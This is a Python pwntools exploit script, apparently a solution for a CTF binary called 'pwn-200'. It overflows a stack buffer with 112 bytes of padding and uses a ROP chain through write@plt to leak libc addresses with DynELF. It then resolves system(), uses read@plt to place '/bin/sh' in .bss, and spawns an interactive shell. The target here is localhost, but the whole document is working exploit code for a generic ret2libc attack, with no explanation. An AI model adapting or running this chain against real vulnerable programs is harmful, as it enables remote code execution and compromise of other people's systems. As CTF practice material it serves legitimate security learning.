from pwn import *
pwn_file = "pwn-200" # pwn题文件 
binary = ELF(pwn_file)

# libc = ELF('')

context.terminal = ['tmux', 'splitw', '-h'] 
if args['DEBUG']:
    context.log_level = True 
elif args['REMOTE']: 
    io = remote('127.0.0.1', 12345)
else: 
    io = process(pwn_file)

# gdb.attach(io)

writePLT = binary.plt['write'] 
readPLT = binary.plt['read'] 
bssAddress = binary.bss(0) 
vulnAddress = 0x8048484

def leak(address): 
    #payload = 'A' * 112 + p32(writePLT) + p32(vulnAddress) + p32(1) + p32(address) + p32(4) 
    payload = flat(['A' * 112,writePLT,vulnAddress,1,address,4]) 
    io.send(payload) 
    data = io.recv(4)
    log.debug("%#x => %s" % (address, binascii.hexlify(data or b'').decode()))
    return data

io.recvline()

dynelf = DynELF(leak,elf=binary) 
systemAddress = dynelf.lookup("__libc_system",'libc') 
log.success(hex(systemAddress))

##
io.send(flat(['A'*112, 0x080483D0]))

payload = flat(['A' * 112,readPLT,systemAddress,0,bssAddress,16,bssAddress])
io.send(payload) 
io.send('/bin/sh\x00') 
io.interactive() 